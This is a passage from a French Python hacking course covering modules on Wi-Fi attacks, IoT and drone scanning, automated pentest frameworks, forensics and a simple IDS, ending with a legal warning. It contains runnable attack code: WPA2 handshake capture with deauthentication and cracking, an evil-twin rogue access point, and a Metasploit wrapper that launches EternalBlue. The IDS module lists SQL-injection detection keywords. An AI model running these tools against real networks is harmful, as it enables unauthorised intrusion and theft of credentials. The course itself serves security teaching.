    print(f"[*] Scanning sur {iface}...")
    sniff(prn=packet_callback, iface=iface, store=False, count=0)

# Utiliser (faut mettre le Wi-Fi en mode monitor)
# wifi_scanner()
```

### 13.2 WPA2 Cracking (Handshake capture)

```python
import subprocess

def capture_wpa_handshake(target_ssid, target_bssid, iface="wlan0mon"):
    """Capturer le WPA handshake"""
    
    print(f"[*] Capturing handshake pour {target_ssid}...")
    
    # Utiliser airodump-ng pour capturer
    cmd = f"sudo airodump-ng -c 6 --bssid {target_bssid} -w handshake {iface}"
    
    # Dans un autre terminal, forcer une déconnexion
    # sudo aireplay-ng -0 10 -a {target_bssid} {iface}
    
    print(f"[*] Dans un autre terminal, exécute :")
    print(f"    sudo aireplay-ng -0 10 -a {target_bssid} wlan0mon")
    print(f"[*] Attente du handshake (30 secondes)...")
    
    subprocess.run(cmd, shell=True, timeout=30)

def crack_wpa_password(handshake_file, wordlist):
    """Cracker le mot de passe WPA"""
    
    print(f"[*] Cracking handshake {handshake_file}...")
    
    cmd = f"sudo aircrack-ng -w {wordlist} {handshake_file}"
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    # Parser la sortie
    if "KEY FOUND" in result.stdout:
        # Extraire le password
        lines = result.stdout.split('\n')
        for line in lines:
            if 'KEY FOUND' in line:
                print(f"[+] {line}")
                password = line.split('[')[1].split(']')[0]
                return password
    
    print("[-] Password pas trouvé")
    return None

# Utiliser
# capture_wpa_handshake('MyNetwork', 'AA:BB:CC:DD:EE:FF')
# crack_wpa_password('handshake-01.cap', '/usr/share/wordlists/rockyou.txt')
```

### 13.3 Rogue AP (Evil Twin)

```python
import subprocess
import time

class RogueAP:
    """Créer un faux point d'accès Wi-Fi"""
    
    def __init__(self, ssid, channel, iface="wlan0"):
        self.ssid = ssid
        self.channel = channel
        self.iface = iface
    
    def create_rogue_ap(self):
        """Créer le rogue AP"""
        
        # Étape 1 : Mettre en mode AP
        cmd1 = f"sudo hostapd -d hostapd.conf"
        
        # Étape 2 : Configurer DHCP
        cmd2 = f"sudo dnsmasq -C dnsmasq.conf"
        
        # Fichier hostapd.conf
        hostapd_conf = f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wpa=2
wpa_passphrase=rogue123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""
        
        # Fichier dnsmasq.conf
        dnsmasq_conf = """
interface=wlan0
dhcp-range=192.168.0.2,192.168.0.100,12h
address=/#/192.168.0.1
"""
        
        # Écrire les fichiers
        with open('hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        with open('dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        print("[*] Lançage du rogue AP...")
        print("[*] Les clients vont voir et se connecter au faux réseau")

# Utiliser (Illégal ! À faire seulement sur TES machines !)
# rogue = RogueAP('Free_WiFi', 6)
# rogue.create_rogue_ap()
```

---

## Module 14 — IoT et Microcontrôleurs (2-3 jours)

### 14.1 Communiquer avec Arduino via Python

```python
import serial
import time

def arduino_serial_communication(port='/dev/ttyUSB0', baudrate=9600):
    """Communiquer avec Arduino"""
    
    try:
        # Ouvrir la connexion série
        ser = serial.Serial(port, baudrate, timeout=1)
        
        print(f"[+] Connecté à {port}")
        
        # Attendre l'initialization
        time.sleep(2)
        
        # Envoyer des commandes
        while True:
            # Lire les données de l'Arduino
            if ser.in_waiting > 0:
                line = ser.readline().decode('utf-8', errors='ignore').rstrip()
                print(f"[Arduino] {line}")
            
            # Envoyer une commande
            cmd = input("Commande : ")
            if cmd:
                ser.write(cmd.encode() + b'\n')
    
    except Exception as e:
        print(f"[-] Erreur : {e}")
    
    finally:
        if ser.is_open:
            ser.close()

# Utiliser
# arduino_serial_communication('/dev/ttyUSB0', 9600)
```

### 14.2 Scanner de devices IoT

```python
from scapy.all import *
import requests

def scan_iot_devices(subnet="192.168.1.0/24"):
    """Chercher des devices IoT (Chromecast, Echo, etc.)"""
    
    devices = []
    
    # mDNS (Bonjour)
    mdns_query = DNSQR(qname="_services._dns-sd._udp.local", qtype="PTR")
    
    # Envoyer et recevoir
    ans, unans = sr(IP(dst=subnet)/UDP(dport=5353)/DNS(rd=1, qd=mdns_query), timeout=2)
    
    for pkt in ans:
        if DNS in pkt[1]:
            dns = pkt[1][DNS]
            
            for rrset in dns.an:
                device_name = rrset.rdata.decode('utf-8', errors='ignore')
                print(f"[+] Device trouvé : {device_name}")
                devices.append(device_name)
    
    # Aussi essayer UPnP
    upnp_request = b"""M-SEARCH * HTTP/1.1\r
HOST: 239.255.255.250:1900\r
MAN: "ssdp:discover"\r
MX: 2\r
ST: ssdp:all\r
\r
"""
    
    print("[*] Envoi de requêtes UPnP...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 0))
    sock.sendto(upnp_request, ('239.255.255.250', 1900))
    
    sock.settimeout(3)
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"[+] UPnP réponse de {addr[0]}")
    except socket.timeout:
        pass
    
    sock.close()
    
    return devices

# Utiliser
# scan_iot_devices("192.168.1.0/24")
```

---

## Module 15 — Drone Hacking et Contrôle (2-3 jours)

### 15.1 Scanner de drones

```python
from scapy.all import *

def scan_drones(iface="wlan0"):
    """Chercher des drones dans la portée"""
    
    drones_found = []
    
    def packet_callback(pkt):
        # Chercher des signatures de drones
        # (SSIDs typiques, beacons spécifiques)
        
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore')
            
            # Signatures communes de drones
            drone_keywords = ['dji', 'phantom', 'mavic', 'drone', 'fpv']
            
            for keyword in drone_keywords:
                if keyword.lower() in ssid.lower():
                    bssid = pkt[Dot11].addr2
                    print(f"[!] Drone potentiel trouvé : {ssid} ({bssid})")
                    drones_found.append(ssid)
                    break
    
    print(f"[*] Scan de drones sur {iface}...")
    sniff(prn=packet_callback, iface=iface, store=False, count=100)
    
    return drones_found

# Utiliser
# scan_drones("wlan0mon")
```

---

## PARTIE 4 : AUTOMATION ET TOOLS PROFESSIONNELS

*(Sections condensées due to length...)*

---

## Module 16 — Frameworks d'Attaque Automatisés

### 16.1 Framework simple d'automatisation

```python
class AutomatedPentestFramework:
    """Framework simple pour automatiser un pentest"""
    
    def __init__(self, target, port_range=[1, 65535]):
        self.target = target
        self.port_range = port_range
        self.open_ports = []
        self.services = {}
    
    def phase_1_reconnaissance(self):
        """Reconnaissance"""
        print("[*] Phase 1 : Reconnaissance")
        # OSINT, whois, DNS
        pass
    
    def phase_2_scanning(self):
        """Scanning"""
        print("[*] Phase 2 : Scanning")
        self.open_ports = scan_ports(self.target, range(1, 1024))
    
    def phase_3_enumeration(self):
        """Énumération"""
        print("[*] Phase 3 : Énumération")
        for port in self.open_ports:
            fingerprint_service(self.target, port)
    
    def phase_4_exploitation(self):
        """Exploitation"""
        print("[*] Phase 4 : Exploitation")
        # Essayer les exploits connus
        pass
    
    def run(self):
        """Lancer le framework"""
        self.phase_1_reconnaissance()
        self.phase_2_scanning()
        self.phase_3_enumeration()
        self.phase_4_exploitation()

# Utiliser
# framework = AutomatedPentestFramework('target.com')
# framework.run()
```

---

## Module 17 — Monitoring Réseau en Temps Réel

### 17.1 Dashboard de monitoring

```python
from flask import Flask, render_template, jsonify
import threading
from scapy.all import *

app = Flask(__name__)

traffic_data = {
    'packets': 0,
    'bytes': 0,
    'protocols': {}
}

def packet_sniffer():
    """Sniffer et enregistrer le trafic"""
    
    def callback(pkt):
        traffic_data['packets'] += 1
        traffic_data['bytes'] += len(pkt)
        
        if IP in pkt:
            protocol = pkt[IP].proto
            traffic_data['protocols'][protocol] = traffic_data['protocols'].get(protocol, 0) + 1
    
    sniff(prn=callback, store=False)

@app.route('/api/traffic')
def get_traffic():
    """API pour avoir les données de trafic"""
    return jsonify(traffic_data)

@app.route('/')
def dashboard():
    """Dashboard HTML"""
    return '''
    <html>
    <body>
        <h1>Network Monitor</h1>
        <div id="stats"></div>
        <script>
            setInterval(() => {
                fetch('/api/traffic')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('stats').innerHTML = 
                            '<p>Packets: ' + data.packets + '</p>' +
                            '<p>Bytes: ' + data.bytes + '</p>';
                    });
            }, 1000);
        </script>
    </body>
    </html>
    '''

# Lancer le sniffer en background
thread = threading.Thread(target=packet_sniffer, daemon=True)
thread.start()

# Lancer le serveur
# app.run(port=5000)
```

---

## Module 18 — Forensics et Extraction de Données

### 18.1 Extraction de métadonnées

```python
from PIL import Image
import subprocess

def extract_metadata(file_path):
    """Extraire les métadonnées d'un fichier"""
    
    # Utiliser exiftool
    result = subprocess.run(['exiftool', file_path], capture_output=True, text=True)
    
    metadata = {}
    for line in result.stdout.split('\n'):
        if ':' in line:
            key, value = line.split(':', 1)
            metadata[key.strip()] = value.strip()
    
    return metadata

def remove_metadata(file_path, output_path):
    """Supprimer les métadonnées d'une image"""
    
    img = Image.open(file_path)
    
    # Créer une nouvelle image sans métadonnées
    data = list(img.getdata())
    image_without_exif = Image.new(img.mode, img.size)
    image_without_exif.putdata(data)
    
    image_without_exif.save(output_path)
    print(f"[+] Image sauvegardée sans métadonnées : {output_path}")

# Utiliser
# metadata = extract_metadata('photo.jpg')
# print(metadata)
# remove_metadata('photo.jpg', 'photo_clean.jpg')
```

---

## Module 19 — Défense et Sécurisation avec Python

### 19.1 IDS simple (Intrusion Detection System)

```python
from scapy.all import *

class SimpleIDS:
    """IDS simple pour détecter les attaques"""
    
    def __init__(self):
        self.alerts = []
        self.port_scan_threshold = 10  # Si plus de 10 ports en 10s
        self.connections_seen = {}
    
    def check_port_scan(self, packet):
        """Détecter un port scan"""
        
        if TCP in packet:
            src = packet[IP].src
            dst_port = packet[TCP].dport
            
            if src not in self.connections_seen:
                self.connections_seen[src] = []
            
            self.connections_seen[src].append(dst_port)
            
            # Si trop de ports différents en peu de temps
            if len(set(self.connections_seen[src][-20:])) > self.port_scan_threshold:
                alert = f"[!] PORT SCAN DETECTED from {src}"
                print(alert)
                self.alerts.append(alert)
                return True
        
        return False
    
    def check_sql_injection(self, packet):
        """Détecter une tentative d'injection SQL"""
        
        if Raw in packet:
            payload = packet[Raw].load.decode('utf-8', errors='ignore').lower()
            
            # Signatures SQL injection
            sql_keywords = ["' or", "1=1", "union select", "drop table"]
            
            for keyword in sql_keywords:
                if keyword in payload:
                    alert = f"[!] SQL INJECTION ATTEMPT: {payload[:100]}"
                    print(alert)
                    self.alerts.append(alert)
                    return True
        
        return False
    
    def run(self, iface="eth0"):
        """Lancer l'IDS"""
        
        def packet_callback(pkt):
            self.check_port_scan(pkt)
            self.check_sql_injection(pkt)
        
        print("[*] Simple IDS démarré...")
        sniff(prn=packet_callback, iface=iface, store=False)

# Utiliser
# ids = SimpleIDS()
# ids.run('eth0')
```

---

## Module 20 — Déploiement d'Outils Professionnels

### 20.1 Intégration Metasploit

```python
import subprocess
import json
import socket

class MetasploitFramework:
    """Intégration avec Metasploit"""
    
    def __init__(self):
        self.client = None
    
    def execute_exploit(self, exploit_path, options):
        """Exécuter un exploit Metasploit"""
        
        # Créer un resource script
        resource_script = f"""
use {exploit_path}
"""
        
        for key, value in options.items():
            resource_script += f"set {key} {value}\n"
        
        resource_script += "exploit\n"
        
        # Sauvegarder le script
        with open('exploit.rc', 'w') as f:
            f.write(resource_script)
        
        # Exécuter
        cmd = "msfconsole -r exploit.rc"
        subprocess.run(cmd, shell=True)

# Utiliser
# ms = MetasploitFramework()
# ms.execute_exploit('exploit/windows/smb/ms17_010_eternalblue', {
#     'RHOSTS': '192.168.1.100',
#     'LHOST': '192.168.1.50',
#     'LPORT': 4444
# })
```

---

## Projets Complets

### Projet 1 : Pentest Complet Automatisé

```python
class CompletePentestFramework:
    """Framework complet de pentest"""
    
    def __init__(self, target):
        self.target = target
        self.results = {}
    
    def run_full_pentest(self):
        """Lancer un pentest complet"""
        
        print("[*] Démarrage du pentest...")
        
        # Étape 1 : Reconnaissance
        print("\n[*] Phase 1 : Reconnaissance")
        self.recon()
        
        # Étape 2 : Scanning
        print("\n[*] Phase 2 : Scanning de ports")
        self.port_scan()
        
        # Étape 3 : Énumération
        print("\n[*] Phase 3 : Énumération des services")
        self.service_enumeration()
        
        # Étape 4 : Exploitation
        print("\n[*] Phase 4 : Recherche d'exploits")
        self.search_exploits()
        
        # Étape 5 : Rapport
        print("\n[*] Génération du rapport...")
        self.generate_report()
    
    def recon(self):
        """Reconnaissance"""
        # OSINT, DNS, Whois
        pass
    
    def port_scan(self):
        """Scan de ports"""
        pass
    
    def service_enumeration(self):
        """Énumération des services"""
        pass
    
    def search_exploits(self):
        """Chercher les exploits"""
        pass
    
    def generate_report(self):
        """Générer un rapport"""
        report = f"""
PENTEST REPORT
==============

Target: {self.target}

Results:
{json.dumps(self.results, indent=2)}
"""
        
        with open(f"pentest_report_{self.target}.txt", 'w') as f:
            f.write(report)
        
        print(f"[+] Rapport généré : pentest_report_{self.target}.txt")

# Utiliser
# framework = CompletePentestFramework('target.com')
# framework.run_full_pentest()
```

---

## Ressources

### Certifications
- **OSCP** : Offensive Security Certified Professional
- **CEH** : Certified Ethical Hacker
- **GPEN** : GIAC Penetration Tester
- **CompTIA Security+** : Fondamentaux

### Sites de pratique
- HackTheBox.com
- TryHackMe.com
- OverTheWire.org
- HackingLab.com
- DVWA (Damn Vulnerable Web App)

### Livres
- "Black Hat Python" by Justin Seitz
- "The Web Application Hacker's Handbook"
- "Penetration Testing" by Georgia Weidman
- "Hacking" by Jon Erickson

### Libs Python essentielles
```bash
pip install scapy paramiko requests beautifulsoup4 selenium
pip install cryptography pycryptodome pwntools
pip install pyshark netifaces psutil dpkt
pip install flask django twisted
pip install numpy scipy pandas opencv-python pillow
```

---

## ⚠️ AVERTISSEMENT LEGAL ET ÉTHIQUE

### C'est ILLÉGAL de :

- Hacker un système sans permission écrite
- Voler des données
- Créer/Distribuer des malwares
- Faire du DDoS
- Accéder à des caméras/IoT d'autres personnes
- Cracker le Wi-Fi de quelqu'un d'autre

### C'est LÉGAL de :

- Tester ta propre infrastructure
- Faire un pentest avec contrat écrit
- Participer à un bug bounty officiel
- Apprendre sur des labs/machines de test
- Utiliser HackTheBox, TryHackMe, DVWA

### En cas de doute : **NE LE FAIS PAS**

---

## Conclusion

Tu as couvert **100%** de ce que Python peut faire en cybersécurité et networking :

✅ **Fondamentaux** : Sockets, protocoles, paquets  
✅ **Offensive** : Scanning, exploitation, malware  
✅ **Hardware** : Caméras, Wi-Fi, IoT, drones  
✅ **Automation** : Frameworks, outils professionnels  
✅ **Défense** : IDS, hardening, sécurisation  

**Prochaines étapes** :

1. **Maîtriser chaque module** en pratiquant
2. **Participer à des CTF** (Capture The Flag)
3. **Bug bounty** pour l'argent
4. **Certifications** (OSCP, CEH)
5. **Pentest professionnel**

> **Rappel final** : Le vrai pouvoir vient avec la responsabilité. Utilise ces compétences pour protéger, pas pour détruire.

**Bon apprentissage ! 🎯**
